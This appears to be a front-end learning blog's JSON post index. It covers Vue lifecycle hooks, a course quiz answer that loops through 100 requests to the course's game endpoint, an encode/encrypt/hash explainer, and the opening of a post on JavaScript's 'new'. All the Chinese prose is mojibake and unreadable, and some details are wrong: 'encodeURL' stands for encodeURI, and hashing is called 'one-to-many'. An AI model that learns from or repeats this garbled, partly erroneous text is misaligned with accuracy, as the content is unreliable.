ï¼šObject.freeze()æœƒæŠŠä¸€å€‹ç‰©ä»¶çµ¦å‡çµä½ï¼Œæ‰€ä»¥è‡ªç„¶å°±ç„¡æ³•åœ¨å°ç‰©ä»¶åšæ›´æ”¹ã€‚ ç”Ÿå‘½é€±æœŸä¸€å€‹ Vue å¯¦é«”æœƒç¶“é å»ºç«‹ â†’ æ›è¼‰ â†’ æ›´æ–° â†’ éŠ·æ¯€é€™å››å€‹éšæ®µï¼Œæˆ‘å€‘æŠŠé€™ç¨±ç‚ºæ˜¯ä¸€å€‹ Vue å¯¦é«”çš„ç”Ÿå‘½é€±æœŸã€‚ åœ¨é€™æ¯ä¸€å€‹éšæ®µä¸­ï¼ŒVue æä¾›äº†å¹¾å€‹ callback functionï¼Œç¨±ä½œ Hooks functionï¼Œèƒ½å¤ è®“ä½ åœ¨ä¸åŒçš„éšæ®µä¸­ï¼Œé€éé€™äº› Hooks function ä¾†åšä¸€äº›äº‹æƒ…ã€‚ ğŸ’¡ è¨»ï¼šåœ–ç‰‡ä¾†æº æ¯å€‹éšæ®µæœƒè§¸ç™¼çš„Hooks functionå¦‚ä¸Šåœ–æ‰€ç¤ºï¼Œå¿˜è¨˜çš„è©±å°±åƒè€ƒé€™å¼µåœ–ã€‚ beforeCreateï¼šå¯¦é«”åœ¨åˆå§‹åŒ–æ™‚å°±æœƒè¢«å‘¼å«ï¼Œæ­¤æ™‚é‚„æ²’æœ‰å»ºç«‹å¯¦é«”ï¼Œæ‰€ä»¥ Vue å¯¦é«”ä¸­çš„ä»»ä½•è¨­å®šï¼ˆä¾‹å¦‚ï¼šdataï¼‰éƒ½é‚„æ²’æœ‰é…ç½®å®Œæˆã€‚ createdï¼šå¯¦é«”å»ºç«‹å®Œæˆï¼Œé€™å€‹æ™‚å€™é™¤äº† $el ä»¥å¤–çš„é…ç½®éƒ½å·²ç¶“å®Œæˆã€‚ï¼ˆ$elå¿…é ˆæ›è¼‰åˆ°æ¨¡æ¿ä¸Šä¹‹å¾Œæ‰æœƒé…ç½®ï¼‰ã€‚ beforeMountï¼šåœ¨å¯¦é«”è¢«æ›è¼‰åˆ°ç›®æ¨™å…ƒç´ ä¹‹å‰æœƒè¢«å‘¼å«ï¼Œé€™æ™‚çš„ $el é‚„åªæ˜¯å€‹æ¨¡æ¿ï¼Œå°šæœªè¢« Vue å¯¦é«”æ¸²æŸ“æˆé é¢ã€‚ mountedï¼šVue å¯¦é«”ä¸Šçš„é…ç½®å·²ç¶“å®‰è£åˆ°æ¨¡æ¿ä¸Šï¼Œé€™æ™‚çš„ $el å·²ç¶“è—‰ç”± Vue å¯¦é«”æ¸²æŸ“æˆçœŸæ­£çš„é é¢ã€‚ beforeUpdateï¼šç•¶å¯¦é«”ä¸­çš„ data ç™¼ç”Ÿæ”¹è®Šï¼Œæˆ–æ˜¯åŸ·è¡Œ vm.$forceUpdate() æ™‚æœƒè¢«å‘¼å«ï¼Œæ­¤æ™‚çš„é é¢é‚„æ²’æœ‰è¢«é‡æ–°æ¸²æŸ“ã€‚ updatedï¼šåœ¨é é¢è¢«é‡æ–°æ¸²æŸ“å¾Œå‘¼å«ï¼Œæ­¤æ™‚çš„é é¢å·²ç¶“è¢«æ¸²æŸ“æˆæ”¹è®Šå¾Œçš„é é¢ã€‚ beforeDestroyï¼šåœ¨æ­¤å¯¦é«”è¢«éŠ·æ¯€ä¹‹å‰å‘¼å«ï¼Œæ­¤æ™‚çš„å¯¦é«”é‚„å…·æœ‰å®Œæ•´çš„åŠŸèƒ½ã€‚ destroyedï¼šåœ¨æ­¤å¯¦é«”è¢«éŠ·æ¯€å¾Œå«ç”¨ï¼Œæ­¤æ™‚å¯¦é«”ä¸­çš„ä»»ä½•å®šç¾©ï¼ˆdataã€methodsâ€¦ç­‰ï¼‰éƒ½å·²ç¶“è¢«è§£é™¤ç¶å®šï¼Œä»£è¡¨åœ¨é€™ä¹‹å¾Œçš„ä»»ä½•æ“ä½œéƒ½æ²’æœ‰ç”¨ã€‚ æˆ‘å€‘ç”¨ä»¥ä¸‹çš„ä¾‹å­ä¾†åšæ¼”ç·´ï¼š 123&lt;div id=\"app\"&gt; &lt;p&gt;{{ a }}&lt;/p&gt;&lt;/div&gt; 123456let vm = new Vue({ el: '#app', data: { a: 1 }}) beforeCreate èˆ‡ createdåœ¨è¨­å®šä¸­åŠ ä¸ŠbeforeCreate èˆ‡ createdï¼š 123456789101112131415161718let vm = new Vue({ el: '#app', data: { a: 1 }, beforeCreate() { console.log('Hook beforeCreate') console.log(`è©¦è‘—è®€å–açš„å€¼ : ${this.a}`) console.log(`è©¦è‘—è®€å–elçš„å€¼ : ${this.$el}`) console.log(' ') }, created() { console.log('Hook created') console.log(`è©¦è‘—è®€å–açš„å€¼ : ${this.a}`) console.log(`è©¦è‘—è®€å–elçš„å€¼ : ${this.$el}`) console.log(' ') }}) çµæœå¦‚ä¸‹ï¼š 1234567Hook beforeCreateè©¦è‘—è®€å–açš„å€¼ : undefinedè©¦è‘—è®€å–elçš„å€¼ : undefinedHook createdè©¦è‘—è®€å–açš„å€¼ : 1è©¦è‘—è®€å–elçš„å€¼ : undefined ğŸš€ Codepenï¼šé»é€™è£¡ beforeCreateï¼šæ­¤æ™‚å¯¦é«”é‚„æ²’æœ‰å»ºç«‹ï¼Œæ‰€ä»¥å»è®€å–å¯¦é«”ä¸­çš„è³‡æ–™éƒ½æœƒå¾—åˆ° undefinedã€‚ createdï¼šå¯¦é«”è¢«å»ºç«‹å®Œæˆå¾Œï¼Œå°±å¯ä»¥è®€å–åˆ° a çš„å€¼ï¼Œè€Œ $el å¿…é ˆç­‰åˆ°æ›è¼‰æ™‚æ‰è®€å–çš„åˆ°ã€‚ æ‰€ä»¥åœ¨ beforeCreate æ˜¯ä¸èƒ½å°å¯¦é«”ä¸­çš„ç‰©ä»¶åšæ“ä½œçš„ beforeMount èˆ‡ mountedç¾åœ¨åŠ ä¸ŠbeforeMount èˆ‡ mountedï¼š 123456789101112131415161718let vm = new Vue({ el: '#app', data: { a: 1 }, beforeMount() { console.log('Hook beforeMount') console.log('è©¦è‘—æ“·å–elå…ƒç´ çš„outerHTML') console.log(this.$el.outerHTML) console.log(' ') }, mounted() { console.log('Hook mounted') console.log('è©¦è‘—æ“·å–elå…ƒç´ çš„outerHTML') console.log(this.$el.outerHTML) console.log(' ') }}) çµæœå¦‚ä¸‹: 123456789Hook beforeMountè©¦è‘—æ“·å–elå…ƒç´ çš„outerHTML&lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt;&lt;/div&gt;Hook mountedè©¦è‘—æ“·å–elå…ƒç´ çš„outerHTML&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;1&lt;/p&gt;&lt;/div&gt; ğŸš€ Codepenï¼šé»é€™è£¡ beforeMountï¼šæµç¨‹åœ–ä¸­æœ‰æåˆ°ï¼Œå¯¦é«”åœ¨æ›è¼‰åˆ°å…ƒç´ ä¸Šä¹‹å‰ï¼Œè‹¥æ²’æœ‰ä½¿ç”¨ template å±¬æ€§çš„è©±ï¼Œå…ƒç´ ï¼ˆé€™è£¡æ˜¯#appï¼‰çš„ outerHTML æœƒå…ˆè¢«ç·¨è­¯æˆæ¨¡æ¿ï¼Œæ‰€ä»¥æ‰èƒ½å¤ è®€å–åˆ° $el çš„è³‡æ–™ï¼Œåªæ˜¯ä»–é‚„æ²’æœ‰è¢« Vue å¯¦é«”ä¸Šçš„å®šç¾©çµ¦æ¸²æŸ“ï¼Œåªæ˜¯å€‹åˆå§‹çš„æ¨¡æ¿ï¼Œæ‰€ä»¥æœƒçœ‹åˆ°éƒ½é‚„æ˜¯ä»¥æ¨¡æ¿èªæ³•çš„å…§å®¹ {{ a }} ä¾†å‘ˆç¾ã€‚ mountedï¼šå¯¦é«”æ›è¼‰åˆ°å…ƒç´ ä¸Šä¹‹å¾Œï¼Œ æ­¤æ™‚çš„ {{ a }} å·²ç¶“è¢« Vue å¯¦é«”ä¸Šçš„å®šç¾©çµ¦æ¸²æŸ“ï¼Œæ‰€ä»¥æœƒçœ‹åˆ°é¡¯ç¤ºçš„æ˜¯ 1ï¼Œä¹Ÿå°±æ˜¯ a åœ¨å¯¦é«”ä¸­çš„å®šç¾©ã€‚ beforeUpdate èˆ‡ updatedç¾åœ¨åŠ ä¸ŠbeforeUpdate èˆ‡ updated 1234567891011121314151617181920let vm = new Vue({ el: '#app', data: { a: 1 }, beforeUpdate() { console.log('Hook beforeUpdate') console.log(`è©¦è‘—æ“·å–açš„å€¼ï¼š${this.a}`) console.log(`è©¦è‘—æ“·å–elçš„å€¼ï¼š${this.$el}`) console.log(`è©¦è‘—æ“·å–elçš„outerHTMLï¼š${this.$el.outerHTML}`) console.log(' ') }, updated() { console.log('Hook updated') console.log(`è©¦è‘—æ“·å–açš„å€¼ï¼š${this.a}`) console.log(`è©¦è‘—æ“·å–elçš„å€¼ï¼š${this.$el}`) console.log(`è©¦è‘—æ“·å–elçš„outerHTMLï¼š${this.$el.outerHTML}`) console.log(' ') }}) ç¾åœ¨åœ¨é é¢ä¸Šæ–°å¢ä¸€å€‹æŒ‰éˆ•ï¼Œç”¨ä¾†å¢åŠ  açš„å€¼ï¼š 1234&lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt; &lt;button class=\"btn\" @click=\"a++\"&gt;add&lt;/button&gt;&lt;/div&gt; ç•¶æŒ‰ä¸‹æŒ‰éˆ•å¾Œï¼Œçµæœå¦‚ä¸‹ï¼š 123456789Hook beforeUpdateè©¦è‘—æ“·å–açš„å€¼ï¼š2è©¦è‘—æ“·å–elçš„å€¼ï¼š[object HTMLDivElement]è©¦è‘—æ“·å–elçš„outerHTMLï¼š&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;1&lt;/p&gt; &lt;button class=\"btn\"&gt;add&lt;/button&gt;&lt;/div&gt;Hook updatedè©¦è‘—æ“·å–açš„å€¼ï¼š2è©¦è‘—æ“·å–elçš„å€¼ï¼š[object HTMLDivElement]è©¦è‘—æ“·å–elçš„outerHTMLï¼š&lt;div id=\"app\"&gt;&lt;p class=\"num\"&gt;2&lt;/p&gt; &lt;button class=\"btn\"&gt;add&lt;/button&gt;&lt;/div&gt; ğŸš€ Codepenï¼šé»é€™è£¡ beforeUpdateï¼š åœ¨ç•«é¢é‡æ–°æ¸²æŸ“ä¹‹å‰ï¼Œå¯¦é«”ä¸­çš„ a å·²ç¶“è¢«æ›´æ–°ç‚º 2ï¼Œä½†ç•«é¢é¡¯ç¤ºçš„é‚„æ˜¯æœªæ›´æ–°å‰çš„è³‡æ–™ 1ã€‚ updatedï¼šç•¶ç•«é¢é‡æ–°æ¸²æŸ“å¾Œï¼Œç•«é¢ä¹Ÿæœƒè¢«æ¸²æŸ“æˆæ›´æ–°å¾Œçš„è³‡æ–™ 2ã€‚ beforeDestroy èˆ‡ destroyedç¾åœ¨åŠ ä¸ŠbeforeDestroy èˆ‡ destroyedï¼š 1234567891011121314let vm = new Vue({ el: '#app', data: { a: 1 }, beforeDestroy() { console.log('Hook beforeDestroy') console.log(' ') }, destroyed() { console.log('Hook destroy') console.log(' ') }}) å†åŠ ä¸Šä¸€å€‹ç”¨ä¾†è§¸ç™¼ destroy() æ’¤éŠ·çš„æŒ‰éˆ•ï¼š 1234567&lt;div class=\"wrap\"&gt; &lt;div id=\"app\"&gt; &lt;p class=\"num\"&gt;{{ a }}&lt;/p&gt; &lt;button class=\"btn\" @click=\"a++\"&gt;add&lt;/button&gt; &lt;button class=\"btn\" @click=\"$destroy()\"&gt;Destroy instance&lt;/button&gt; &lt;/div&gt;&lt;/div&gt; ç•¶æŒ‰ä¸‹æŒ‰éˆ•æ™‚ï¼Œçµæœå¦‚ä¸‹ï¼š 123Hook beforeDestroyHook destroy ğŸš€ Codepenï¼šé»é€™è£¡ beforeDestroyï¼šè¡¨ç¤ºå³å°‡åŸ·è¡ŒéŠ·æ¯€å‹•ä½œï¼Œå¦‚æœæœ‰äº›ç‰©ä»¶è¦é‡‹æ”¾è³‡æºå¯ä»¥åœ¨é€™è™•ç†ã€‚ destroyï¼šæ­¤æ™‚å¯¦é«”å·²ç¶“éŠ·æ¯€ã€‚ åƒè€ƒè³‡æ–™ä»‹ç» â€” Vue.jsé‡æ–°èªè­˜ Vue.js | Kuro Hsu[Vue] é‚„æ˜¯ä¸æ‡‚ Computed ï¼Ÿvue.js è®¡ç®—å±æ€§ computedã€getter å’Œ setter çš„ä¸€äº›æ€è€ƒã€‘é‚£äº›é—œæ–¼ Vue çš„å°ç´°ç¯€ - Computed ä¸­ getter å’Œ setter è§¸ç™¼çš„æ™‚é–“é»[Vue.js] updated()ï¼Œè¦æ€éº¼ç”¨ï¼é¢è¯•å®˜ï¼šä¸ºä»€ä¹ˆ Vue ä¸­çš„ v-if å’Œ v-for ä¸å»ºè®®ä¸€èµ·ç”¨?","link":"/2021/08/26/vue/"},{"title":"week10 ç¶œåˆèƒ½åŠ›æ¸¬é©—","text":"ç°¡å–®ç´€éŒ„ ç°¡è¿°é€™æ˜¯ä¾†è‡ªç¬¬åé€±çš„ ç¶œåˆèƒ½åŠ›æ¸¬é©—ã€‚å¯«é€™ç¯‡åªæ˜¯æƒ³è¨˜éŒ„ä¸€ä¸‹æœ€å¾Œä¸€é¡Œçš„è§£æ³•ï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥è‡ªè¡Œå»ç©ç©çœ‹ã€‚ æœ€å¾Œä¸€é¡Œæœ€å¾Œçš„æç¤ºæ˜¯è¦å»çœ‹ JavaScript çš„ codeï¼Œæ‰€ä»¥ devtool &gt; sources æ‰“é–‹ script.js æœƒçœ‹åˆ°é€™æ®µï¼š 123456789101112131415161718192021222324252627$(document).ready(function () { $('#goForIt').on('click', function () { console.log('ä½ æˆåŠŸæŒ‰ä¸‹æŒ‰éˆ•äº†ï¼') if (typeof myMissingNumberToSetToMakeTheRequest !== 'undefined') { $.ajax({ url: './ajax.php', type: 'GET', data: 'number=' + myMissingNumberToSetToMakeTheRequest, dataType: 'json', success: function (data) { console.log('æˆåŠŸç™¼é€ ajax request') console.log(data) if (data['error'] === false) { var result = data['s'] console.log('Result: ' + result) } else { console.log('error: ' + data['error']) } } }) } else { console.log('å°‘äº†äº›ä»€éº¼...') } })}) æ­£ç¢ºçš„åšæ³•æ˜¯å…ˆæŠŠ #goForIt æŠ“å‡ºä¾†ä¸¦è¨­å®š myMissingNumberToSetToMakeTheRequest çš„å€¼ä¾†é€ requestã€‚ä½†ä»”ç´°è§€å¯Ÿå¾Œæœƒç™¼ç¾æœ‰æ›´å¿«çš„åšæ³•ï¼Œåªè¦ç™¼ request åˆ° http://mentor-program.co/huli/game/ajax.php?number=xxx æ‹¿ response å°±å¥½äº†ã€‚ number çš„ç¯„åœæ˜¯ 1 ~ 100ï¼Œæ‰€ä»¥å°±å¯«å€‹æš´åŠ›è§£çš„ functionï¼š 1234567891011121314151617181920// å–®å€‹ responsefunction getResponse(n) { return new Promise((resolve, reject) =&gt; { const xhr = new XMLHttpRequest() xhr.open('GET', `http://mentor-program.co/huli/game/ajax.php?number=${n}`, true) xhr.onload = () =&gt; { resolve(JSON.parse(xhr.responseText)) } xhr.send() })}// ç™¼å‡º 100 æ¬¡ request~(async function getAllResponse() { for (let i = 1; i &lt;= 100; i++) { console.log(i) const json = await getResponse(i) console.log(json) }})() å‚™è¨»ï¼šå¾Œä¾†ç™¼ç¾é€™é¡Œæ²’æœ‰é–‹ CROSï¼Œæ‰€ä»¥å¦‚æœè¦æŠŠé€™æ®µæ‹¿å»è·‘çš„è©±ï¼Œè«‹å…ˆåˆ° http://mentor-program.co/huli/game/ajax.php?number=1 é€™å€‹ Domain ä¸‹å†è²¼åˆ° console è£¡ï¼›æˆ–æ˜¯æ”¹ç”¨ Node.js ä¾†ç™¼ request ä¹Ÿè¡Œã€‚ æœ€å¾Œç­”æ¡ˆå°±å‡ºä¾†å›‰ï¼š","link":"/2022/02/12/week10-game/"},{"title":"Encodeã€Encrypt è·Ÿ Hash çš„å·®åˆ¥","text":"å°çŸ¥è­˜å¤§å­¸å•ã€‚ æ‡¶äººåŒ…Encode ç·¨ç¢¼ ç”¨å¦ä¸€ç¨®æ–¹å¼è¡¨ç¤ºè³‡æ–™ æ¯«ç„¡å®‰å…¨æ€§ï¼Œå› ç‚ºæœ¬ä¾†çš„ç”¨é€”å°±ä¸æ˜¯ç‚ºäº†å®‰å…¨ Encrypt åŠ å¯† ä¸€å°ä¸€çš„é—œä¿‚ï¼ˆä¸€å€‹æ˜æ–‡å°æ‡‰ä¸€çµ„å¯†æ–‡ï¼‰ éœ€è¦é€é keyï¼ˆé‡‘é‘°ï¼‰ä¾†åŸ·è¡Œ å¯ä»¥å¾çµæœé€†æ¨å›å» å¯ä»¥åœ¨ç´°åˆ†ç‚ºå°ç¨±å¼èˆ‡éå°ç¨±å¼ Hash é›œæ¹Š ä¸€å°å¤šçš„é—œä¿‚ï¼ˆç„¡é™çš„è¼¸å…¥ï¼Œæœ‰é™çš„è¼¸å‡ºï¼‰ ä¸å¯ä»¥é€†æ¨å›å»ï¼ˆå°±ç®—ä½ çŸ¥é“æ¼”ç®—æ³•æ˜¯ä»€éº¼ï¼‰ åŒæ¨£çš„æ±è¥¿ä¸Ÿé€²å»ï¼Œå‡ºä¾†çš„çµæœæ°¸é ä¸€æ¨£ Encode ç·¨ç¢¼å…¶å¯¦åªç”¨å¦ä¸€ç¨®æ–¹å¼ä¾†ã€Œè¡¨ç¤ºè³‡æ–™ã€ï¼Œä¾‹å¦‚ URI ç·¨ç¢¼ï¼Œå‡è¨­æˆ‘å€‘æœ‰æ®µç¶²å€æ˜¯ https://www.google.com/search?q=ç„¡æ…˜ï¼Œæ¥è‘—ç”¨ JavaScript ä¸­çš„ encodeURI å°±æœƒè®Šæˆ 'https://www.google.com/search?q=%E7%84%A1%E6%85%98'ï¼Œå¦‚æœè¦è½‰å›å»å°±æ”¹ç”¨ decodeURIï¼š 1234encodeURL('https://www.google.com/search?q=ç„¡æ…˜')// https://www.google.com/search?q=%E7%84%A1%E6%85%98decodeURI('https://www.google.com/search?q=%E7%84%A1%E6%85%98')// https://www.google.com/search?q=ç„¡æ…˜ ç‚ºä»€éº¼è¦åšç·¨ç¢¼ï¼Œä»¥ URI ä¾†èªªæœ‰å…©å€‹ç†ç”±ï¼š ä¸æ˜¯æ¯å€‹äººçš„é›»è…¦éƒ½æœ‰æ”¯æ´ä¸­æ–‡ æŸäº›å­—å…ƒæœƒè·Ÿç¨‹å¼ç”¢ç”Ÿè¡çªï¼Œä¾‹å¦‚ = ' \" ç­‰ç­‰ é‚„æœ‰å¦å¤–ä¸€å€‹å¾ˆæœ‰è¶£çš„ä¾‹å­æ˜¯ base64ã€‚å‡è¨­æˆ‘æƒ³è¦æŠŠåœ–ç‰‡ç”¨ã€Œç´”æ–‡å­—ã€å‚³çµ¦æŸå€‹äººï¼Œæˆ‘å¯ä»¥é€™æ¨£åšï¼š 1cat picture.jpg | base64 &gt; picture.txt é€™æ™‚å€™ picture.txt çš„å…§å®¹å°±æœƒæ˜¯ä¸€æ®µçœ‹äº†å°±æšˆçš„ç¢¼ï¼š 123456/9j/4AAQSkZJRgABAQEAeAB4AAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAOGBagDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3..... æ¥è‘—æ‹¿åˆ°æ–‡å­—æª”çš„äººåªè¦è§£ç¢¼å°±å¯ä»¥å¾—åˆ°åœ–ç‰‡ï¼š 12# åŠ ä¸Š -d = decodecat picture.txt | base64 -d &gt; cool.jpg ä¸€æ¨£é™„ä¸Šç²¾ç¾åœ–ç‰‡ï¼š Encrypt åŠ å¯†åŠ å¯†å°±æ˜¯ç”¨ä¸€å€‹ keyï¼ˆé‡‘é‘°ï¼‰ä¾†æŠŠã€Œæ˜æ–‡ã€è®Šæˆã€Œå¯†æ–‡ã€ï¼Œæœ€ç°¡å–®çš„ä¾‹å­æ˜¯ã€Œå‡±è–©åŠ å¯†ã€ã€‚å‡±è–©åŠ å¯†æ˜¯æŠŠæ¯å€‹å­—æ¯åšä½ç§»ï¼Œè€Œä½ç§»çš„æ•¸é‡å°±æ˜¯åŠ å¯†çš„ keyã€‚ 123456789101112131415161718function caesarCipher(s, key) { let result = '' for (let i = 0; i &lt; s.length; i++) { // å–å¾— ASCII CODE const code = s.charCodeAt(i) // ä½ç§»å¾Œçš„æ•¸å­— let m = code + (key % 26) // å¦‚æœè¶…å‡ºç¯„åœ if (m &gt; 122) { // å–é¤˜æ•¸ï¼Œä¸¦åŠ ä¸Š 96ï¼Œå› ç‚º a å¾ 97 é–‹å§‹ m = (m % 122) + 96 } // è½‰å›æ–‡å­— result += String.fromCharCode(m) } return result}caesarCipher('A', 3) // ä½ç§»ä¸‰æ¬¡ï¼Œæ‰€ä»¥æ˜¯ D åªè¦çŸ¥é“ keyï¼Œå°±å¯ä»¥æŠŠçµæœé€†æ¨å›å»ã€‚ é€™å€‹æ˜¯åŠ å¯†æœ€å¤§çš„ç‰¹é»ã€‚åƒä¸Šé¢çš„ä¾‹å­åªè¦çŸ¥é“ key æ˜¯ 3ï¼Œå°±èƒ½é€†æ¨å›å»ï¼Œå¾ D æ¨å› Aã€‚ å°ç¨±å¼åŠ å¯†èˆ‡éå°ç¨±å¼åŠ å¯†å¦å¤–åŠ å¯†é‚„å¯ä»¥åˆ†æˆã€Œå°ç¨±å¼åŠ å¯†ã€è·Ÿã€Œéå°ç¨±å¼åŠ å¯†ã€ã€‚ç°¡å–®ä¾†èªªï¼Œå°ç¨±å¼å°±æ˜¯é›™æ–¹éƒ½æ˜¯ç”¨åŒä¸€å€‹ key ä¾†åšåŠ å¯†è·Ÿè§£å¯†ï¼Œè€Œéå°ç¨±å¼æ˜¯æŠŠ key åˆ†æˆã€Œå…¬é‘°ã€èˆ‡ã€Œç§é‘°ã€ã€‚ ç‚ºä»€éº¼è¦é€™æ¨£åšï¼Ÿå‡è¨­å°æ˜è·Ÿå°ç¾çš„å°è©±æ˜¯ç”¨å‡±è–©åŠ å¯†ä¾†åšåŠ å¯†ï¼Œé‚£é›™æ–¹ä¸€å®šè¦çŸ¥é“ key æ˜¯ä»€éº¼æ‰èƒ½åŠ å¯†è·Ÿè§£å¯†å°å§ï¼Ÿä½†ç¶²è·¯çš„ä¸–ç•Œæ˜¯ä¸å®‰å…¨çš„ï¼ˆåœ¨æ²’æœ‰ HTTPS ä»¥å‰ï¼‰ï¼Œé™¤éå°æ˜å°ç¾åœ¨ç¾å¯¦å°±ç´„å‡ºä¾†äº‹å…ˆè¬›å¥½ key æ˜¯ä»€éº¼ï¼Œä¸ç„¶åªè¦é€éç¶²è·¯å°±æœ‰æ©Ÿæœƒè¢«ã€Œä¸­é–“äººã€æŠŠ key å·èµ°ï¼Œé€™æ¨£å°±ç®—ä½ ç”¨åœ¨å²å®³çš„åŠ å¯†æ–¹å¼éƒ½æ²’æœ‰æ„ç¾©äº†ã€‚ éå°ç¨±å¼åŠ å¯†å°±æ˜¯ç‚ºäº†è§£æ±ºåŒä¸€å€‹ key çš„å•é¡Œè€Œèª•ç”Ÿã€‚ä½ è¦å°ä¸€å€‹æª”æ¡ˆåŠ å¯†å°±ç”¨ã€Œå…¬é‘°ã€ï¼Œè¦è§£å¯†å°±ç”¨åªæœ‰ä½ è‡ªå·±çŸ¥é“çš„ã€Œç§é‘°ã€ã€‚é€™æ¨£å­å°±ç®—ä¸­é–“äººæŠŠå…¬é‘°å·èµ°äº†ä»–ä¹Ÿæ²’è¾¦æ³•è§£å¯†ï¼Œå› ç‚ºç”¨å…¬é‘°åŠ å¯†çš„å…§å®¹åªèƒ½ç”¨ç§é‘°è§£ã€‚ åƒè€ƒé€™æ®µä¾‹å­ï¼š åŒæ¨£çš„æƒ…æ³ç•¶ä½ è¦å‚³æª”æ¡ˆçµ¦ Aliceï¼Œå°±å…ˆè«‹ Alice ç”Ÿä¸€çµ„ Key ç„¶å¾ŒæŠŠå…¬é‘°å‚³çµ¦ä½ ã€‚ä½ æœ‰äº† Alice ç”¢ç”Ÿçš„å…¬é‘°ä¹‹å¾Œï¼Œå°±ç”¨å…¬é‘°å¹«æª”æ¡ˆåŠ å¯†å†å‚³çµ¦å¥¹ï¼ŒAlice æ”¶åˆ°å°±å¯ä»¥ç”¨å¥¹è‡ªå·±æ‰‹ä¸Šçš„ç§é‘°è§£é–‹ å®‰å…¨æ€§æ–¹é¢ï¼Œå› ç‚ºç§é‘°å¾é ­åˆ°å°¾éƒ½åœ¨ Alice æ‰‹ä¸Šï¼Œå®Œå…¨æ²’æœ‰å‚³å‡ºå»éï¼Œæ‰€ä»¥å³ä¾¿ä¸­é–“äººå–å¾—å…¬é‘°åŠ å¯†å¾Œçš„æª”æ¡ˆä¹Ÿæ²’è¾¦æ³•è§£é–‹ï¼Œè¶…å®‰å…¨ der Hash é›œæ¹ŠHash å°±æ˜¯æŠŠä¸€å€‹ functionï¼ŒæŠŠä¸€æ®µæ–‡å­—æˆ–æ•¸å­—ä¸Ÿé€²å»ä¹‹å¾Œæœƒç”¢ç”Ÿä¸€å€‹çµæœï¼Œä¾‹å¦‚èªªï¼š 123let str = 'hello'let hash = SHA256(str)console.log(hash) // 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824 æˆ‘ä¸ç®¡ä¸Ÿé€²å»å¹¾æ¬¡ hello æ°¸é éƒ½æœƒå¾—åˆ° 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824ï¼Œé€™å€‹æ˜¯é›œæ¹Šçš„ç‰¹æ€§ã€‚æ‰€ä»¥è¦åˆ¤æ–·å…©å€‹æ±è¥¿æ˜¯ä¸æ˜¯ä¸€æ¨£çš„ï¼Œåªè¦çœ‹é›œæ¹Šå¾Œçš„å€¼ä¸€ä¸ä¸€æ¨£å°±çŸ¥é“äº†ã€‚ å¦å¤–æœ‰ä¸€ç¨®å¯èƒ½æ˜¯ä¸åŒçš„ input é›œæ¹Šå¾Œçš„å€¼ä¸€æ¨£ï¼Œé€™å€‹å«åšã€Œç¢°æ’ã€ï¼Œä½†æ©Ÿç‡å¾ˆå°å¾ˆå°å¾ˆå°ï¼ˆ1/2Â¹Â²â¸ï¼‰ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥å¿½ç•¥ã€‚ é€™æ˜¯å› ç‚ºç„¡é™çš„è¼¸å…¥ï¼Œæœ‰é™çš„è¼¸å‡ºæ‰€é€ æˆçš„ï¼Œå°±å¥½åƒé´¿ç± åŸç†ä¸€æ¨£ï¼Œæ‰€ä»¥é›£å…æœƒæœ‰é€™ç¨®æƒ…æ³ç™¼ç”Ÿã€‚ å‚™è¨»ï¼šé´¿ç± åŸç† = 10 éš»é´¿å­æ”¾é€² 9 å€‹é´¿ç± ï¼Œé‚£éº¼ä¸€å®šæœ‰ä¸€å€‹é´¿ç± æ”¾é€²äº†è‡³å°‘å…©éš»é´¿å­ æ‰€ä»¥é›œæ¹Šæœ‰å€‹æœ€é‡è¦çš„ç‰¹æ€§æ˜¯ï¼š æ²’æœ‰è¾¦æ³•å¾çµæœé€†æ¨å›å» æ²’æœ‰è¾¦æ³•å¾çµæœé€†æ¨å›å» æ²’æœ‰è¾¦æ³•å¾çµæœé€†æ¨å›å» ç‚ºä»€éº¼ï¼Ÿå‡è¨­æˆ‘æœ‰å€‹é›œæ¹Šå‡½å¼é•·é€™æ¨£ï¼š 1234567function hash(n) { return n % 999}console.log(hash(1)) // 1console.log(hash(1000)) // 1console.log(hash(1001)) // 2console.log(hash(2000)) // 2 å°±ç®—æˆ‘ç¾åœ¨çŸ¥é“é€™å€‹ hash çš„æ¼”ç®—æ³•æ˜¯ä»€éº¼ï¼Œä½†æ˜¯åœ¨æˆ‘åªçŸ¥é“çµæœæ˜¯ 2 çš„æ™‚å€™è¦æ€éº¼çŸ¥é“åŸæœ¬æ˜¯ 1001 é‚„æ˜¯ 2000ï¼Ÿéƒ½æœ‰å¯èƒ½é˜¿ã€‚æ‰€ä»¥é€™å°±æ˜¯ç‚ºä»€éº¼é›œæ¹Šæ²’æœ‰è¾¦æ³•è¢«é€†æ¨ã€‚","link":"/2022/02/08/what-are-encoding-encrypt-and-hashing/"},{"title":"new å¯¦éš›ä¸Šåœ¨åšä»€éº¼ï¼Ÿ","text":"æ¯”æˆ‘å€‘æƒ³çš„éƒ½é‚„ç°¡å–® ç°¡è¿°å…¶å¯¦ new èƒŒå¾Œåšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼š å»ºç«‹ä¸€å€‹ç©ºç‰©ä»¶ æŠŠç©ºç‰©ä»¶ä¸Ÿåˆ° constructor è£¡é¢åŸ·è¡Œ æŠŠ __proto__ æŒ‡å‘å°æ‡‰çš„ prototype å›å‚³ instance é™„è¨»ï¼šè¦ç†è§£é€™å€‹ç¯„ä¾‹è¦å…ˆç†è§£ apply æˆ– call çš„ç”¨æ³•ï¼Œå¯ä»¥åƒè€ƒ function ä¸­çš„ call apply bind 